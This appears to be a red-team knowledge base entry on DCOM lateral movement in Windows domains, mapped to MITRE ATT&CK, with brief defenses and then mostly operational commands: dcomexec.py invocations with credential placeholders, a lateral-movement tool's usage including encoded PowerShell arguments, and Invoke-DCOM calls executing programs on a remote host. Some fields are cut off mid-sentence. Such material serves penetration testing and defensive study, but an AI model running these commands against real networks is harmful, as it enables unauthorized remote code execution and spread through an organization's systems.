---
id: 69951d65-d2a9-42c1-96b4-3652fc6a3384
name: DCOM Lateral Movement
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:07.056151+00:00'
updated_at: '2023-04-10T20:26:18.140402+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote Services|T1021 - Remote Services]]'
sub_techniques:
- '[[SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin Shares]]'
tags:
- '[[Active Directory Attacks]]'
- '[[DCOM Exploitation]]'
commands:
- '[[Execute command without output]]'
- '[[Execute command with output]]'
- '[[Execute notepad.exe with debug mode]]'
- '[[Invoke DCOM to Start Calc.exe using MMC20.Application and ExcelDDE Methods]]'
- '[[Invoke DCOM to Start Calc.exe using ShellBrowserWindow and ShellWindows Methods]]'
- '[[Invoke DCOM to Start MyService]]'
- '[[Lateral Movement DCOM]]'
---

# DCOM Lateral Movement

## Summary

DCOM (Distributed Component Object Model) is a Microsoft technology that allows for communication between software components on different machines in a network. Attackers can leverage DCOM to move laterally within a network by executing commands on remote machines. This technique allows attackers 

## Description

# Description

DCOM (Distributed Component Object Model) is a Microsoft technology that allows for communication between software components on different machines in a network. Attackers can leverage DCOM to move laterally within a network by executing commands on remote machines. This technique allows attackers to bypass network defenses and gain access to sensitive systems and data. The business value of this attack is that it allows attackers to gain access to sensitive information and systems, which can lead to data theft or ransomware attacks.

Technical Explanation: DCOM is a protocol used by Microsoft Windows to allow communication between software components on different machines in a network. It uses a combination of Remote Procedure Call (RPC) and Component Object Model (COM) to allow for communication between software components. Attackers can use DCOM to execute commands on remote machines, allowing them to move laterally within a network. This technique can be used to bypass network defenses, such as firewalls and intrusion detection systems.



 

## Requirements

1. Valid credentials with permissions to execute DCOM commands

1. Access to a remote machine with DCOM enabled

 

## Defense

1. Disable DCOM where possible

1. Use network segmentation to limit lateral movement

1. Monitor network traffic for DCOM activity

 

## Objectives

1. Move laterally within a network

1. Gain access to sensitive systems and data

 

# Instructions

1. The DCOMExec command is used to remotely execute commands on a Windows machine via DCOM. The command takes in various arguments such as -share, -object, -hashes, -no-pass, -k, -aesKey, -dc-ip, -A, and -keytab. The target parameter specifies the IP address or hostname of the target machine. The command parameter specifies the command to be executed on the target machine. The -object argument specifies the type of object to be instantiated. The -silentcommand flag executes the command without attempting to retrieve the output.

 



**Code**: [[dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] ]]



> The DCOMExec command is used to remotely execute commands on a Windows machine via DCOM. The -share argument is used to specify the share name to use when connecting to the target machine. The -object argument is used to specify the type of object to be instantiated. The -hashes argument is used to specify the LM and NT hashes of the target user's password. The -no-pass argument is used to specify that no password will be used for authentication. The -k argument is used to specify the Kerberos target domain. The -aesKey argument is used to specify the AES key to use for authentication. The -dc-ip argument is used to specify the IP address of the domain controller to use for authentication. The -A argument is used to specify the path to the authentication file. The -keytab argument is used to specify the path to the keytab file. The target parameter specifies the IP address or hostname of the target machine. The command parameter specifies the command to be executed on the target machine. The -silentcommand flag executes the command without attempting to retrieve the output.



**Command** ([[Execute command without output]]):

```bash
dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>'
```





**Command** ([[Execute command with output]]):

```bash
dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>' 'ipconfig'
```





**Command** ([[Execute notepad.exe with debug mode]]):

```bash
python3 dcomexec.py -object MMC20 -silentcommand -debug $DOMAIN/$USER:$PASSWORD\$@$HOST 'notepad.exe'
```



2. To use this tool, specify the target machine using the -t or --target flag followed by the target IP address or hostname. Then, specify the binary to use with the -b or --binary flag followed by the binary name, such as powershell.exe. You can also specify any arguments for the binary using the -a or --args flag followed by the arguments. Next, choose a method for lateral movement using the -m or --method flag followed by one of the available methods: MMC20Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, or OfficeMacro. If you want to enable registry manipulation, use the -r, --reg, or --registry flag. For help, use the -h, -?, or --help flag.

 



**Code**: [[# https://klezvirus.github.io/RedTeaming/LateralMo]]



> This tool is designed for lateral movement within a network using DCOM. It allows the user to specify a target machine, binary, and method for lateral movement. The available methods include MMC20Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, and OfficeMacro. Additionally, the tool can be used to manipulate registry entries on the target machine. For more information on how to use this tool, please refer to the instructions provided.



**Command** ([[Lateral Movement DCOM]]):

```powershell
-t, --target=VALUE         Target Machine
-b, --binary=VALUE         Binary: powershell.exe
-a, --args=VALUE           Arguments: -enc <blah>
-m, --method=VALUE         Methods: MMC20Application, ShellWindows,
                            ShellBrowserWindow, ExcelDDE, VisioAddonEx,
                            OutlookShellEx, ExcelXLL, VisioExecLine, 
                            OfficeMacro
-r, --reg, --registry      Enable registry manipulation
-h, -?, --help             Show Help

Current Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro.
```



3. This command can be used to execute remote commands via DCOM. It imports the Invoke-DCOM PowerShell script and then uses it to execute multiple commands on the target computer. The commands that can be executed are MMC20.Application, ExcelDDE, ServiceStart, ShellBrowserWindow, and ShellWindows.

 



**Code**: [[Import-Module .\Invoke-DCOM.ps1
Invoke-DCOM -Compu]]



> The command takes the following arguments:
-ComputerName: The IP address or hostname of the target computer.
-Method: The method to be used for remote command execution. Possible values are MMC20.Application, ExcelDDE, ServiceStart, ShellBrowserWindow, and ShellWindows.
-Command: The command to be executed on the target computer.

Note: This command can be used for malicious purposes and should only be used for authorized and legitimate purposes.



**Command** ([[Invoke DCOM to Start Calc.exe using MMC20.Application and ExcelDDE Methods]]):

```bash
Import-Module .\Invoke-DCOM.ps1
Invoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command "calc.exe"
Invoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command "calc.exe"
```





**Command** ([[Invoke DCOM to Start MyService]]):

```bash
Invoke-DCOM -ComputerName '10.10.10.10' -Method ServiceStart "MyService"
```





**Command** ([[Invoke DCOM to Start Calc.exe using ShellBrowserWindow and ShellWindows Methods]]):

```bash
Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow -Command "calc.exe"
Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command "calc.exe"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote Services|T1021 - Remote Services]]

### Sub-Techniques

- [[SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin Shares]]

## Commands Used

- [[Execute command without output]]
- [[Execute command with output]]
- [[Execute notepad.exe with debug mode]]
- [[Invoke DCOM to Start Calc.exe using MMC20.Application and ExcelDDE Methods]]
- [[Invoke DCOM to Start Calc.exe using ShellBrowserWindow and ShellWindows Methods]]
- [[Invoke DCOM to Start MyService]]
- [[Lateral Movement DCOM]]

## Tags

- [[Active Directory Attacks]]
- [[DCOM Exploitation]]


